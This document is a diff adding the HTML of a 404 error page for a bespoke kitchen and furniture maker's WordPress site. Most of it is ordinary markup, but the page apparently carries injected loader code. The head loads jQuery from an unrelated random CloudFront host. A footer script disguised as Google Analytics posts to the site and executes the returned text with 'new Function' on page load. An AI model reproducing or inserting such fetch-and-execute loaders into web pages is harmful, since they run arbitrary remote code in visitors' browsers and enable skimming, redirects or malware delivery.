@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<!--[if IE 7]><html class="ie ie7" lang="en-US"><![endif]--><!--[if IE 8]><html class="ie ie8" lang="en-US"><![endif]--><!--[if !(IE 7) | !(IE 8) ]><!--><html lang="en-US"><!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Page not found | Heaven &amp; Stubbs</title>
+<link rel="stylesheet" type="text/css" href="http://www.heavenandstubbs.com/client/themes/custom/style.css?ver=1480535501">
+<script src="//dc6k1alk91llc.cloudfront.net/jquery-latest.min.js"></script>
+<!--[if lt IE 9]><script src="http://www.heavenandstubbs.com/client/themes/custom/js/html5.js"></script><![endif]-->
+<link rel='dns-prefetch' href='//platform-api.sharethis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel='stylesheet' id='responsive-lightbox-swipebox-css'  href='http://www.heavenandstubbs.com/client/plugins/responsive-lightbox/assets/swipebox/css/swipebox.min.css?ver=1.7.2' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.heavenandstubbs.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='http://www.heavenandstubbs.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='//platform-api.sharethis.com/js/sharethis.js#product=ga'></script>
+<link rel='https://api.w.org/' href='https://www.heavenandstubbs.com/wp-json/' />
+		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<link href="//fonts.googleapis.com/css?family=Alegreya+Sans+SC:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+</head>
+
+<body class="error404 masthead-fixed full-width">
+
+<div class="cookies">This site uses cookies to track general usage. No personal details are stored. <span>click to close</span></div>
+
+<div class="small">
+	<div class="logo"><a href="/"><img src="http://www.heavenandstubbs.com/client/themes/custom/images/logo-clear.png" alt="" height="80" width="80"></a></div>
+
+	<nav class="site-navigation">
+		<div class="inner"><ul>
+<li class="page_item page-item-2 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-kitchens">Kitchens</a></li>
+<li class="page_item page-item-9 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-studies">Studies</a></li>
+<li class="page_item page-item-11 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-libraries">Libraries</a></li>
+<li class="page_item page-item-13 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-bathrooms">Bathrooms</a></li>
+<li class="page_item page-item-5"><a href="https://www.heavenandstubbs.com/">Heaven &#038; Stubbs</a></li>
+<li class="page_item page-item-19 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-bedrooms">Bedrooms</a></li>
+<li class="page_item page-item-17"><a href="https://www.heavenandstubbs.com/about">About</a></li>
+<li class="page_item page-item-21"><a href="https://www.heavenandstubbs.com/testimonials">Testimonials</a></li>
+<li class="page_item page-item-23"><a href="https://www.heavenandstubbs.com/contact">Contact</a></li>
+</ul></div>
+	</nav>
+</div>
+<main id="post-" class="">
+	<section class="thegallery">
+		&nbsp;
+	</section>
+	<section class="meat">
+		<div class="inner">
+			<h1>Not Found</h1>
+			<h2>The page your are trying to access is not available.</h2>
+			<p>Please check the URL to make sure it is accurate, or <a href="/">return home</a> to try again.</p>
+		</div>
+	</section>
+</main>
+
+
+<div class="large">
+	<div class="logo small"><a href="/"><img src="http://www.heavenandstubbs.com/client/themes/custom/images/logo-clear.png" alt="" height="80" width="80"></a></div>
+
+	<nav class="site-navigation">
+		<div class="inner"><ul>
+<li class="page_item page-item-2 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-kitchens">Kitchens</a></li>
+<li class="page_item page-item-9 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-studies">Studies</a></li>
+<li class="page_item page-item-11 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-libraries">Libraries</a></li>
+<li class="page_item page-item-13 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-bathrooms">Bathrooms</a></li>
+<li class="page_item page-item-5"><a href="https://www.heavenandstubbs.com/">Heaven &#038; Stubbs</a></li>
+<li class="page_item page-item-19 page_item_has_children"><a href="https://www.heavenandstubbs.com/bespoke-bedrooms">Bedrooms</a></li>
+<li class="page_item page-item-17"><a href="https://www.heavenandstubbs.com/about">About</a></li>
+<li class="page_item page-item-21"><a href="https://www.heavenandstubbs.com/testimonials">Testimonials</a></li>
+<li class="page_item page-item-23"><a href="https://www.heavenandstubbs.com/contact">Contact</a></li>
+</ul></div>
+	</nav>
+</div>
+
+<script type="text/javascript" src="http://www.heavenandstubbs.com/client/themes/custom/js/scripts.js"></script>
+<script>
+    jQuery(document).ready(function () {
+		jQuery.post('https://www.heavenandstubbs.com?ga_action=googleanalytics_get_script', {action: 'googleanalytics_get_script'}, function(response) {
+			var F = new Function ( response );
+			return( F() );
+		});
+    });
+</script><script type='text/javascript' src='http://www.heavenandstubbs.com/client/plugins/responsive-lightbox/assets/swipebox/js/jquery.swipebox.min.js?ver=1.7.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var rlArgs = {"script":"swipebox","selector":"lightbox","customEvents":"","activeGalleries":"1","animation":"1","hideCloseButtonOnMobile":"0","removeBarsOnMobile":"0","hideBars":"0","hideBarsDelay":"5000","videoMaxWidth":"1080","useSVG":"1","loopAtEnd":"0","woocommerce_gallery":"0"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.heavenandstubbs.com/client/plugins/responsive-lightbox/js/front.js?ver=1.7.2'></script>
+<script type='text/javascript' src='http://www.heavenandstubbs.com/wp-includes/js/wp-embed.min.js?ver=4.8.2'></script>
+</body>
+</html>
